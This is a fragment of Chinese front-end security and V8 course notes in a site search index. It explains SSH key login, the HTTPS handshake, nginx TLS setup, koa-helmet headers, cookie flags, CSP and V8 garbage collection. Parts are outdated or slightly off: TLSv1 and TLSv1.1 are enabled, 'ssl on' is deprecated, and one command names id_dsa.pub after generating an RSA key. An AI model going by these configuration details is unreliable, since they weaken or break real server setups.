\u5ea6\u7b49\u540c\u4e8e\u5206\u89e3\u4e24\u4e2a\u5de8\u5927\u8d28\u6570\u7684\u79ef.\u8fd9\u5c31\u662fEve\u4e0d\u53ef\u80fd\u5bf9Alice\u7684\u5bc6\u6587\u89e3\u5bc6\u4ee5\u53ca\u516c\u5319\u53ef\u4ee5\u5728\u7f51\u4e0a\u516c\u5e03\u7684 \u539f\u56e0. \u81f3\u4e8e\"\u5de8\u5927\u8d28\u6570\"\u8981\u591a\u5927\u624d\u80fd\u4fdd\u8bc1\u5b89\u5168\u7684\u95ee\u9898\u4e0d\u7528\u62c5\u5fc3:\u5229\u7528\u5f53\u524d\u53ef\u9884\u6d4b\u7684\u8ba1\u7b97\u80fd\u529b,\u5728\u5341\u8fdb\u5236\u4e0b,\u5206 \u89e3\u4e24\u4e2a250\u4f4d\u8d28\u6570\u7684\u79ef\u8981\u7528\u6570\u5341\u4e07\u5e74\u7684\u65f6\u95f4;\u5e76\u4e14\u8d28\u6570\u7528\u5c3d\u6216\u4e24\u53f0\u8ba1\u7b97\u673a\u5076\u7136\u4f7f\u7528\u76f8\u540c\u8d28\u6570\u7684\u6982\u7387 \u5c0f\u5230\u53ef\u4ee5\u88ab\u5ffd\u7565.</p> <p>SSH\u516c\u94a5\u767b\u5f55\u539f\u7406</p> <p>https://www.cnblogs.com/scofi/p/6617394.html \u539f\u7406\u4ecb\u7ecd \u5bc6\u7801\u53e3\u4ee4\u767b\u5f55</p> <p>\u901a\u8fc7\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\uff0c\u4e3b\u8981\u6d41\u7a0b\u4e3a:</p> <p>1\u3001\u5ba2\u6237\u7aef\u8fde\u63a5\u4e0a\u670d\u52a1\u5668\u4e4b\u540e\uff0c\u670d\u52a1\u5668\u628a\u81ea\u5df1\u7684\u516c\u94a5\u4f20\u7ed9\u5ba2\u6237\u7aef</p> <p>2\u3001\u5ba2\u6237\u7aef\u8f93\u5165\u670d\u52a1\u5668\u5bc6\u7801\u901a\u8fc7\u516c\u94a5\u52a0\u5bc6\u4e4b\u540e\u4f20\u7ed9\u670d\u52a1\u5668</p> <p>3\u3001\u670d\u52a1\u5668\u6839\u636e\u81ea\u5df1\u7684\u79c1\u94a5\u89e3\u5bc6\u767b\u5f55\u5bc6\u7801\uff0c\u5982\u679c\u6b63\u786e\u90a3\u4e48\u5c31\u8ba9\u5ba2\u6237\u7aef\u767b\u5f55</p> <p>\u516c\u94a5\u767b\u5f55</p> <p>\u516c\u94a5\u767b\u5f55\u662f\u4e3a\u4e86\u89e3\u51b3\u6bcf\u6b21\u767b\u5f55\u670d\u52a1\u5668\u90fd\u8981\u8f93\u5165\u5bc6\u7801\u7684\u95ee\u9898\uff0c\u6d41\u884c\u4f7f\u7528RSA\u52a0\u5bc6\u65b9\u6848\uff0c\u4e3b\u8981\u6d41\u7a0b\u5305\u542b:</p> <p>1\u3001\u5ba2\u6237\u7aef\u751f\u6210RSA\u516c\u94a5\u548c\u79c1\u94a5 2\u3001\u5ba2\u6237\u7aef\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5b58\u653e\u5230\u670d\u52a1\u5668  3\u3001\u5ba2\u6237\u7aef\u8bf7\u6c42\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5c06\u4e00\u4e2a\u7528\u516c\u94a5\u52a0\u5bc6\u968f\u673a\u5b57\u7b26\u4e32\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef  4\u3001\u5ba2\u6237\u7aef\u6839\u636e\u81ea\u5df1\u7684\u79c1\u94a5\u52a0\u5bc6\u8fd9\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\u4e4b\u540e\u518d\u53d1\u9001\u7ed9\u670d\u52a1\u5668 5\u3001\u670d\u52a1\u5668\u63a5\u53d7\u5230\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u4e4b\u540e\u7528\u516c\u94a5\u89e3\u5bc6\uff0c\u5982\u679c\u6b63\u786e\u5c31\u8ba9\u5ba2\u6237\u7aef\u767b\u5f55\uff0c\u5426\u5219\u62d2\u7edd\u3002</p> <p>\u5ba2\u6237\u7aef</p> <p>\u670d\u52a1\u5668</p> <p>\u53d1\u51fa\u9a8c\u8bc1\u8bf7\u6c42</p> \u7528\u516c\u94a5\u52a0\u5bc6\u7684\u968f\u673a\u6570 \u7528\u79c1\u94a5\u89e3\u5bc6\u540e\u7684\u968f\u673a\u6570 \u6b63\u786e\u540e\u540c\u610f\u767b\u5f55 <p>\u8fd9\u6837\u5c31\u4e0d\u7528\u4f7f\u7528\u5bc6\u7801\u4e86\u3002</p> <p>\u5ba2\u6237\u7aef</p> <p>\u670d\u52a1\u5668</p> <p>\u751f\u6210\u516c\u94a5</p> <pre><code>ssh-keygen -t rsa -P ''\n\nxubin@xubindeMBP:~$ ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/Users/xubin/.ssh/id_rsa):\n/Users/xubin/.ssh/id_rsa already exists.\nOverwrite (y/n)? yes\nEnter passphrase (empty for no passphrase):\n\nEnter same passphrase again:\nYour identification has been saved in /Users/xubin/.ssh/id_rsa.\nYour public key has been saved in /Users/xubin/.ssh/id_rsa.pub.\nThe key fingerprint is:\nSHA256:IeFPfrcQ3hhP64SRTAFzGIHl2ROcopl5HotRi2XNOGk xubin@xubindeMBP\nThe key's randomart image is:\n+---[RSA 2048]----+\n\n|\n |\n |\n |\n |\n | |o| || || +----[SHA256]-----+\n\n.o*@=o | ..oEB=o | o@=+O . | B=+o@. | =So* * | .o.=.|\n\n# \u67e5\u770b\u516c\u94a5\n cat .ssh/id_rsa.pub\n\n# \u5c06\u516c\u94a5\u62f7\u2ec9\u5230\u670d\u52a1\u5668\n scp ~/.ssh/id_rsa.pub root@47.98.252.XXX:/root\n\n# \u5c06\u516c\u94a5\u52a0\u5165\u4fe1\u4efb\u5217\u8868\n cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys\n</code></pre> <p>\u7f51\u7ad9\u5982\u4f55\u901a\u8fc7\u52a0\u5bc6\u548c\u7528\u6237\u5b89\u5168\u901a\u8baf</p> <p>\u963f\u91cc\u4e91\u4e0a\u53ef\u4ee5\u8bbe\u7f6e\u7f51\u7ad9\u8bc1\u4e66\uff08DigiCert\uff09</p> <p>\u6d4f\u89c8\u5668</p> <ul> <li> <p>\u670d\u52a1\u5668  \u8bc1\u4e66\u4fe1\u4efb\u673a\u6784\uff1b\u53d1\u9001\u4e00\u4e2aHTTPS\u9762\u8bf7\u6c42 \u8be2\u95ee\u8bc1\u4e66\u6709\u6548\u6027</p> </li> <li> <p>\u670d\u52a1\u5668  \u8bc1\u4e66\u4fe1\u4efb\u673a\u6784</p> </li> </ul> <p>\u8bc1\u4e66 + \u516c\u94a5</p> <p>\u7528\u516c\u94a5\u52a0\u5bc6\u7684\u5bf9\u79f0\u79d8\u94a5</p> <p>\u662f\u5426\u6709\u6548</p> <p>\u901a\u8fc7\u5bf9\u79f0\u79d8\u94a5\u901a\u4fe1</p> <p>\u6d4f\u89c8\u5668</p> <p>https\u7684\u4e3b\u8981\u5b9e\u73b0\u8fc7\u7a0b\u8bf4\u660e:</p> <p>(1)\u5728\u901a\u4fe1\u4e4b\u524d\uff0c\u670d\u52a1\u5668\u7aef\u901a\u8fc7\u52a0\u5bc6\u7b97\u6cd5\u751f\u6210\u4e00\u5bf9\u5bc6\u94a5\uff0c\u5e76\u628a\u5176\u516c\u94a5\u53d1\u7ed9CA\u7533\u8bf7\u6570\u5b57\u8bc1\u4e66\uff0cCA\u5ba1\u6838 \u540e\uff0c\u7ed3\u5408\u670d\u52a1\u7aef\u53d1\u6765\u7684\u76f8\u5173\u4fe1\u606f\u751f\u6210\u6570\u5b57\u8bc1\u4e66\uff0c\u5e76\u628a\u8be5\u6570\u5b57\u8bc1\u4e66\u53d1\u56de\u7ed9\u670d\u52a1\u5668\u7aef\u3002</p> <p>(2)\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u7ecftcp\u4e09\u6b21\u63e1\u624b\uff0c\u5efa\u7acb\u521d\u6b65\u8fde\u63a5\u3002</p> <p>(3)\u5ba2\u6237\u7aef\u53d1\u9001http\u62a5\u6587\u8bf7\u6c42\u5e76\u534f\u5546\u4f7f\u7528\u54ea\u79cd\u52a0\u5bc6\u7b97\u6cd5\u3002</p> <p>(4)\u670d\u52a1\u7aef\u54cd\u5e94\u62a5\u6587\u5e76\u628a\u81ea\u8eab\u7684\u6570\u5b57\u7b7e\u540d\u53d1\u7ed9\u670d\u52a1\u7aef\u3002</p> <p>(5)\u5ba2\u670d\u7aef\u4e0b\u8f7dCA\u7684\u516c\u94a5\uff0c\u9a8c\u8bc1\u5176\u6570\u5b57\u8bc1\u4e66\u7684\u62e5\u6709\u8005\u662f\u5426\u662f\u670d\u52a1\u5668\u7aef(\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5f97\u5230\u670d\u52a1\u5668\u7aef\u7684 \u516c\u94a5)\u3002(\u4e00\u822c\u662f\u5ba2\u6237\u7aef\u9a8c\u8bc1\u670d\u52a1\u7aef\u7684\u8eab\u4efd\uff0c\u670d\u52a1\u7aef\u4e0d\u7528\u9a8c\u8bc1\u5ba2\u6237\u7aef\u7684\u8eab\u4efd\u3002)</p> <p>(6)\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5ba2\u6237\u7aef\u751f\u6210\u4e00\u4e2a\u968f\u673a\u5bf9\u79f0\u5bc6\u94a5\uff0c\u7528\u8be5\u5bc6\u94a5\u52a0\u5bc6\u8981\u53d1\u9001\u7684URL\u94fe\u63a5\u7533\u8bf7\uff0c\u518d\u7528\u670d\u52a1 \u5668\u7aef\u7684\u516c\u94a5\u52a0\u5bc6\u8be5\u5bc6\u94a5\uff0c\u628a\u52a0\u5bc6\u7684\u5bc6\u94a5\u548c\u52a0\u5bc6\u7684URL\u94fe\u63a5\u4e00\u8d77\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002</p> <p>(7)\u670d\u52a1\u5668\u7aef\u4f7f\u7528\u81ea\u8eab\u7684\u79c1\u94a5\u89e3\u5bc6\uff0c\u83b7\u5f97\u4e00\u4e2a\u5bf9\u79f0\u5bc6\u94a5\uff0c\u518d\u7528\u8be5\u5bf9\u79f0\u5bc6\u94a5\u89e3\u5bc6\u7ecf\u52a0\u5bc6\u7684URL\u94fe\u63a5\uff0c\u83b7 \u5f97URL\u94fe\u63a5\u7533\u8bf7\u3002</p> <p>(8)\u670d\u52a1\u5668\u7aef\u6839\u636e\u83b7\u5f97\u7684URL\u94fe\u63a5\u53d6\u5f97\u8be5\u94fe\u63a5\u7684\u7f51\u2eda\uff0c\u5e76\u7528\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u5bf9\u79f0\u5bc6\u94a5\u628a\u8be5\u7f51\u2eda\u52a0\u5bc6\u540e\u53d1 \u7ed9\u5ba2\u6237\u7aef\u3002</p> <p>(9)\u5ba2\u6237\u7aef\u6536\u5230\u52a0\u5bc6\u7684\u7f51\u2eda\uff0c\u7528\u81ea\u8eab\u7684\u5bf9\u79f0\u5bc6\u94a5\u89e3\u5bc6\uff0c\u5c31\u80fd\u83b7\u5f97\u7f51\u2eda\u7684\u5185\u5bb9\u4e86\u3002 (10)TCP\u56db\u6b21\u6325\u624b\uff0c\u901a\u4fe1\u7ed3\u675f\u3002</p> <p>\u6839\u8bc1\u4e66\u5728\u54ea\u91cc</p> <p>windows</p> <p>\u5728Windows\u4e0b\u6309Windows+ R, \u8f93\u5165certmgr.msc\uff0c\u5728\u201c\u53d7\u4fe1\u4efb\u7684\u6839\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u201d-\u201c\u8bc1\u4e66\u4e2d\u201d\u627e\u5230 \u201cROOTCA\u201d\uff0c\u622a\u6b62\u65e5\u671f2025/08/23\uff0c\u5355\u51fb\u53f3\u952e\uff0c\u5c5e\u6027\uff0c\u53ef\u4ee5\u67e5\u770b\u5176\u5c5e\u6027\u201c\u7981\u7528\u6b64\u8bc1\u4e66\u7684\u6240\u6709\u76ee\u7684\u201d</p> <p>Mac</p> <p>\u94a5\u5319\u4e32</p> <p>http://www.techug.com/post/https-ssl-tls.html HTTPS\u52a0\u5bc6\u539f\u7406\u4ecb\u7ecd \u914d\u7f6e\u8fc7\u7a0b</p> <p>\u4fee\u6539\u5f00\u53d1\u673a\u7684host \u524d\u7f6e</p> <p>\u963f\u91cc\u4e91\u53d6\u5f97\u7684\u771f\u5b9e\u8bc1\u4e66 (\u57df\u540d www.josephxia.com) \u8bc1\u4e66\u7684\u683c\u5f0f\u8bf4\u660e</p> <p>PKCS \u5168\u79f0\u662f Public-Key Cryptography Standards \uff0c\u662f\u7531 RSA \u5b9e\u9a8c\u5ba4\u4e0e\u5176\u5b83\u5b89\u5168\u7cfb\u7edf\u5f00\u53d1\u5546\u4e3a \u4fc3\u8fdb\u516c\u94a5\u5bc6\u7801\u7684\u53d1\u5c55\u800c\u5236\u8ba2\u7684\u4e00\u7cfb\u5217\u6807\u51c6\uff0cPKCS \u76ee\u524d\u5171\u53d1\u5e03\u8fc7 15 \u4e2a\u6807\u51c6\u3002 \u5e38\u7528\u7684\u6709: PKCS#7 </p> <pre><code>Cryptographic Message Syntax Standard\nPKCS#10 Certification Request Standard\n\n# \u5f00\u53d1\u673a\u7684hosts\u6587\u4ef6 /etc/hosts # \u6dfb\u52a0\n127.0.0.1 www.josephxia.com\n</code></pre> <p>PKCS#12 Personal Information Exchange Syntax Standard X.509\u662f\u5e38\u2ec5\u901a\u7528\u7684\u8bc1\u4e66\u683c\u5f0f\u3002\u6240\u6709\u7684\u8bc1\u4e66\u90fd\u7b26\u5408\u4e3aPublic Key Infrastructure (PKI) \u5236\u5b9a\u7684 ITU-T X509 \u56fd\u9645\u6807\u51c6\u3002  PKCS#7 \u5e38\u7528\u7684\u540e\u7f00\u662f: .P7B .P7C .SPC  PKCS#12 \u5e38\u7528\u7684\u540e\u7f00\u6709: .P12 .PFX  X.509 DER \u7f16\u7801(ASCII)\u7684\u540e\u7f00\u662f: .DER .CER .CRT  X.509 PAM \u7f16\u7801(Base64)\u7684\u540e\u7f00\u662f: .PEM .CER .CRT .cer/.crt\u662f\u7528\u4e8e\u5b58\u653e\u8bc1\u4e66\uff0c\u5b83\u662f2\u8fdb\u5236\u5f62\u5f0f\u5b58\u653e\u7684\uff0c\u4e0d\u542b\u79c1\u94a5\u3002 .pem\u8ddfcrt/cer\u7684\u533a\u522b\u662f\u5b83\u4ee5Ascii\u6765\u8868\u793a\u3002 pfx/p12\u7528\u4e8e\u5b58\u653e\u4e2a\u4eba\u8bc1\u4e66/\u79c1\u94a5\uff0c\u4ed6\u901a\u5e38\u5305\u542b\u4fdd\u62a4\u5bc6\u7801\uff0c2\u8fdb\u5236\u65b9\u5f0f  p10\u662f\u8bc1\u4e66\u8bf7\u6c42  p7r\u662fCA\u5bf9\u8bc1\u4e66\u8bf7\u6c42\u7684\u56de\u590d\uff0c\u53ea\u7528\u4e8e\u5bfc\u5165</p> <p>\u53c2\u8003\u9879\u76ee\u76ee\u5f55 nginx/conf.d/cert docker\u6a21\u62dfnginx\u73af\u5883 <pre><code># \u5b89\u5168\u8bfe\u7a0b\u6839\u76ee\u5f55 version: '3.1' services:\n\nnginx:\nrestart: always\nimage: nginx\nports: \n- 80:80\n  - 443:443\nvolumes:\n- ./conf.d/:/etc/nginx/conf.d\n  - ./html/:/var/www/html/\n\n    \u539f\u59cb\u768480\u7aef\u53e3\u670d\u52a1\n\n# conf.d/www.josephxia.com.conf\nserver {\n  listen       80;\n  server_name  www.josephxia.com;\n  location / {\n    root   /var/www/html;\n    index  index.html index.htm;\n  }\n}\n# \u589e\u52a0\u7684\u90e8\u5206\nserver {\n  listen 443;\n  server_name localhost;\n  ssl on;\n\n  root html;\n  index index.html index.htm;\n\n  # \u4e3b\u8981\u662f\u4e0b\u9762\u7684\u914d\u7f6e\n  # \u516c\u94a5 + \u8bc1\u4e66\n  ssl_certificate conf.d/cert/www.josephxia.com.pem;\n  # \u79c1\u94a5\n  ssl_certificate_key conf.d/cert/www.josephxia.com.key; ssl_session_timeout 5m;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-\n    SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_prefer_server_ciphers on;\n\n  # \u4e3b\u8981\u662f\u4e0b\u9762\u7684\u914d\u7f6e\n  location / {\n    root /var/www/html;\n    index index.html index.htm;\n  }\n}\n</code></pre> \u589e\u52a0http -&gt; https\u5f3a\u5236\u8df3\u8f6c</p> <p><pre><code># conf.d/www.josephxia.com.conf\nserver {\n  listen       80;\n  server_name  www.josephxia.com;\n  # location / {\n    # root /var/www/html;\n    # index index.html index.htm;\n  }\n  location / {\n    rewrite ^(.*) https://www.josephxia.com/$1 permanent;\n    }\n}\n</code></pre> SSL\u8bc1\u4e66\u5206\u7c7b https://blog.csdn.net/TrustAsia/article/details/73770588</p> <p>\u5165\u2ed4\u7ea7 DVSSL - \u57df\u540d\u6709\u6548 \u65e0\u2ed4\u69db  \u4f01\u4e1a\u578b OVSSL - \u4f01\u4e1a\u8d44\u8d28\u3001\u4e2a\u4eba\u8ba4\u8bc1  \u589e\u5f3a\u578bEVSSL - \u6d4f\u89c8\u5668\u7ed9\u4e88\u7eff\u8272\u5730\u5740\u680f\u663e\u793a\u516c\u53f8\u540d\u5b57</p>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#4-helmet15min","title":"4. helmet\u4e2d\u95f4\u4ef6(15min)","text":"<p>\u82f1[\u02c8helm\u026at] \u5934\u76d4</p> <p>https://www.npmjs.com/package/koa-helmet</p> <pre><code>// npm i koa-helmet -s\nconst Koa = require(\"koa\");\nconst helmet = require(\"koa-helmet\");\nconst app = new Koa();\napp.use(helmet());\napp.use((ctx) =&gt; {\n  ctx.body = \"Hello World\"\n});\napp.listen(4000);\n</code></pre> <p>Strict-Transport-Security:\u5f3a\u5236\u4f7f\u7528\u5b89\u5168\u8fde\u63a5(SSL/TLS\u4e4b\u4e0a\u7684HTTPS)\u6765\u8fde\u63a5\u5230\u670d\u52a1\u5668\u3002</p> <p>X-Frame-Options:\u63d0\u4f9b\u5bf9\u4e8e\u201c\u70b9\u51fb\u52ab\u6301\u201d\u7684\u4fdd\u62a4\u3002</p> <p>X-XSS-Protection:\u5f00\u542f\u5927\u591a\u73b0\u4ee3\u6d4f\u89c8\u5668\u5185\u5efa\u7684\u5bf9\u4e8e\u8de8\u7ad9\u811a\u672c\u653b\u51fb(XSS)\u7684\u8fc7\u6ee4\u529f\u80fd\u3002 </p> <p>X-Content-Type-Options: \u9632\u6b62\u6d4f\u89c8\u5668\u4f7f\u7528MIME-sniffing\u6765\u786e\u5b9a\u54cd\u5e94\u7684\u7c7b\u578b\uff0c\u8f6c\u800c\u4f7f\u7528\u660e\u786e\u7684 content-type\u6765\u786e\u5b9a\u3002 </p> <p>Content-Security-Policy:\u9632\u6b62\u53d7\u5230\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u4ee5\u53ca\u5176\u4ed6\u8de8\u7ad9\u6ce8\u5165\u653b\u51fb\u3002</p>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#5-session","title":"5. Session\u7ba1\u7406","text":"<p>\u5bf9\u4e8ecookie\u7684\u5b89\u5168\u4f7f\u7528\uff0c\u5176\u91cd\u8981\u6027\u662f\u4e0d\u8a00\u800c\u55bb\u7684\u3002\u7279\u522b\u662f\u5bf9\u4e8e\u52a8\u6001\u7684web\u5e94\u7528\uff0c\u5728\u5982HTTP\u8fd9\u6837\u7684\u65e0\u72b6</p> <p>\u6001\u534f\u8bae\u7684\u4e4b\u4e0a\uff0c\u5b83\u4eec\u9700\u8981\u4f7f\u7528cookie\u6765\u7ef4\u6301\u72b6\u6001 Cookie\u6807\u793a</p> <p>secure - \u8fd9\u4e2a\u5c5e\u6027\u544a\u8bc9\u6d4f\u89c8\u5668\uff0c\u4ec5\u5728\u8bf7\u6c42\u662f\u901a\u8fc7HTTPS\u4f20\u8f93\u65f6\uff0c\u624d\u4f20\u9012cookie\u3002  HttpOnly - \u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u5c06\u7981\u6b62 javascript \u811a\u672c\u83b7\u53d6\u5230\u8fd9\u4e2acookie\uff0c\u8fd9\u53ef\u4ee5\u7528\u6765\u5e2e\u52a9\u9632\u6b62 \u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002</p> <p>Cookie\u57df</p> <p>domain - \u8fd9\u4e2a\u5c5e\u6027\u7528\u6765\u6bd4\u8f83\u8bf7\u6c42URL\u4e2d\u670d\u52a1\u7aef\u7684\u57df\u540d\u3002\u5982\u679c\u57df\u540d\u5339\u914d\u6210\u529f\uff0c\u6216\u8fd9\u662f\u5176\u5b50\u57df \u540d\uff0c\u5219\u7ee7\u7eed\u68c0\u67e5 path \u5c5e\u6027\u3002  path - \u9664\u4e86\u57df\u540d\uff0ccookie\u53ef\u7528\u7684URL\u8def\u5f84\u4e5f\u53ef\u4ee5\u88ab\u6307\u5b9a\u3002\u5f53\u57df\u540d\u548c\u8def\u5f84\u90fd\u5339\u914d\u65f6\uff0ccookie\u624d \u4f1a\u968f\u8bf7\u6c42\u53d1\u9001\u3002</p> <p>expires - \u8fd9\u4e2a\u5c5e\u6027\u7528\u6765\u8bbe\u7f6e\u6301\u4e45\u5316\u7684cookie\uff0c\u5f53\u8bbe\u7f6e\u4e86\u5b83\u4e4b\u540e\uff0ccookie\u5728\u6307\u5b9a\u7684\u65f6\u95f4\u5230\u8fbe\u4e4b \u524d\u90fd\u4e0d\u4f1a\u8fc7\u671f\u3002</p>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#6","title":"6.\u6d4f\u89c8\u5668\u5b89\u5168\u63a7\u5236","text":"<p>X-XSS-Protection \u9632\u6b62\u53cd\u5c04\u578bXSS Strict-Transport-Security \u5f3a\u5236\u4f7f\u7528HTTPS\u901a\u4fe1</p> <p>CSP</p> <p>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_ cnvoid#%E6%A6%82%E8%BF%B0</p> <p>https://juejin.im/post/5c6ad29ff265da2da00ea459</p> <p>HTTP \u54cd\u5e94\u5934 Content-Security-Policy \u5141\u8bb8\u7ad9\u70b9\u7ba1\u7406\u8005\u5728\u6307\u5b9a\u7684\u2eda\u9762\u63a7\u5236\u7528\u6237\u4ee3\u7406\u7684\u8d44\u6e90\u3002\u9664\u4e86\u5c11\u6570\u4f8b \u5916\uff0c\u8fd9\u6761\u653f\u7b56\u5c06\u6781\u5927\u5730\u6307\u5b9a\u670d\u52a1\u6e90 \u4ee5\u53ca\u811a\u672c\u7aef\u70b9\u3002\u8fd9\u5c06\u5e2e\u52a9\u9632\u6b62\u8de8\u7ad9\u811a\u672c\u653b\u51fb(Cross-Site Script) (XSS).</p> <p>\u5b89\u5168\u9632\u8303\u7684\u603b\u7ed3</p> <p>https://www.tuicool.com/articles/7Ff2EbZ</p> <p>\u65e0\u5934\u6d4f\u89c8\u5668\u6280\u672f - JS \u63a7\u5236API \u76f4\u63a5\u64cd\u7eb5Chrome</p> <pre><code>&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-\nsrc https://*; child-src 'none';\"&gt;\n</code></pre>"},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/","title":"02-v8\u5f15\u64ce\u56de\u6536\u5185\u5b58","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5296  \u9605\u8bfb11\u5206\u949f</p> <p>\u4e3a\u4ec0\u4e48\u5b66\u4e60\u5185\u5b58\uff1a</p> <ul> <li> <p>\u524d\u7aef\uff1a\u9632\u6b62\u524d\u7aef\u754c\u9762\u5185\u5b58\u5360\u7528\u8fc7\u5927\uff0c\u9020\u6210\u754c\u9762\u5361\u987f\u751a\u81f3\u65e0\u54cd\u5e94</p> </li> <li> <p>\u540e\u7aef\uff1aNode \u4f7f\u7528\u7684\u4e5f\u662fV8\u5f15\u64ce\uff0c\u5185\u5b58\u5bf9\u4e8e\u540e\u7aef\u670d\u52a1\u7684\u6027\u80fd\u5f88\u91cd\u8981\u3002\u540e\u7aef\u670d\u52a1\u7684\u6301\u4e45\u6027\u548c\u5065\u58ee\u6027\uff0c\u540e\u7aef\u5f88\u5bb9\u6613\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u3002</p> </li> </ul> <p>\u4e3a\u4ec0\u4e48\u524d\u7aef\u8981\u4e86\u89e3\u5e95\u5c42\uff1f\u73b0\u5728\u524d\u7aef\u7684\u6280\u672f\u5168\u9762\u6027\u5f88\u91cd\u8981\u3002\u4e0d\u4e00\u5b9a\u8981\u4f7f\u7528express\u5b8c\u6210\u670d\u52a1\u5668\u7aef\u6846\u67b6\u8bbe\u7f6e\uff0c\u4f46\u662f\u9700\u8981\u4e86\u89e3\u539f\u7406\uff08\u589e\u52a0\u7ade\u4e89\u529b\uff09\u3002</p>"},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/#1v8-gc","title":"1\u3001V8 \u5f15\u64ce GC \u673a\u5236","text":"<p>V8\u7684\u5185\u5b58\u5206\u4e3a\u65b0\u751f\u4ee3\u5185\u5b58\u7a7a\u95f4\u548c\u8001\u751f\u4ee3\u5185\u5b58\u7a7a\u95f4\uff08\u65b0\u751f\u4ee3\u5f88\u5c0f\uff09\u3002V8\u5f15\u64ce\u5185\u5b58\u548c\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\uff0c64\u4f4d\u64cd\u4f5c\u7cfb\u7edf1.4G\uff0864MB+1400MB\uff09\uff0c32\u4f4d\u7cfb\u7edf0.7G\uff0816MB+700MB\uff09\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8bbe\u8ba1\u62101.4G\uff1f</p> <ul> <li>JS\u6700\u521d\u8bbe\u8ba1\u4e3a\u4e86\u524d\u7aef\uff0c\u9700\u8981\u7684\u6570\u636e\u4e0d\u662f\u6301\u4e45\u6027\u7684\uff0c\u6267\u884c\u4e00\u6b21\u5c31GC\uff0c1.4\u8db3\u591f</li> <li>JS \u6267\u884c GC \u65f6\uff0c\u4f1a\u6682\u505c\u811a\u672c\u6267\u884c\uff0c\u5982\u679c\u592a\u5446\uff0cGC\u6d88\u8017\u65f6\u95f4</li> </ul> <p>\u65b0\u751f\u4ee3\u548c\u8001\u751f\u4ee3\u6570\u636e\u533a\u522b\uff1f</p> <ul> <li>\u65b0\u751f\u4ee3\u5b58\u653e\u77ed\u671f\u7684\u6700\u65b0\u7684\u6570\u636e\uff0c\u8001\u751f\u4ee3\u5b58\u653e\u8f83\u8001\u7684\u6570\u636e\u3002</li> <li>\u6570\u636e\u8f6c\u6362\uff1a\u5982\u679c\u65b0\u751f\u4ee3\u7684\u67d0\u4e2a\u6570\u636e\uff08\u6570\u7ec4\uff09\u5df2\u7ecf\u7ecf\u8fc7\u4e00\u6b21GC\uff0c\u540c\u65f6\u65b0\u751f\u4ee3To\u7a7a\u95f4\u5df2\u7ecf\u4f7f\u7528\u4e8625%\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65b0\u751f\u4ee3\u6570\u636e\u5c31\u653e\u5728\u8001\u751f\u4ee3\u4e2d\u3002</li> </ul> <p>GC \u7b97\u6cd5\u533a\u522b\uff1a</p> <p>\u65b0\u751f\u4ee3\u5185\u5b58\u5904\u7406\u7b97\u6cd5\uff1a\u590d\u5236\uff0c\u65b0\u751f\u4ee3\u5185\u5b58\u5206\u6210\u4e24\u90e8\u5206\uff08from-to\uff09\u9996\u5148\u5728\u4e00\u4e2a\u90e8\u5206\u5b58\u653e\u53d8\u91cf\u3002\u5f53V8\u89c9\u5f97\u9700\u8981\u6e05\u7a7a\u5185\u5b58\u65f6\uff0c\u5c06\u5b58\u653e\u53d8\u91cf\u90e8\u5206\u4e2d\u6709\u7528\u7684\u53d8\u91cf\u590d\u5236\u5230\u53e6\u4e00\u4e2a\u533a\u57df\u4e2d\uff0c\u7136\u540e\u6e05\u7a7a\u8fd9\u4e2a\u533a\u57df\u3002\u4e0b\u4e00\u6b21\u6e05\u7a7a\u5185\u5b58\u65f6\uff0c\u64cd\u4f5c\u5bf9\u8c03\u3002\u727a\u7272\u4e86\u7a7a\u95f4\u590d\u6742\u5ea6\uff08\u53ea\u4f7f\u7528\u4e00\u534a\u5185\u5b58\uff09\uff0c\u4f18\u5316\u4e86\u65f6\u95f4\u590d\u6742\u5ea6\uff08\u76f4\u63a5\u590d\u5236\uff09\u3002</p> 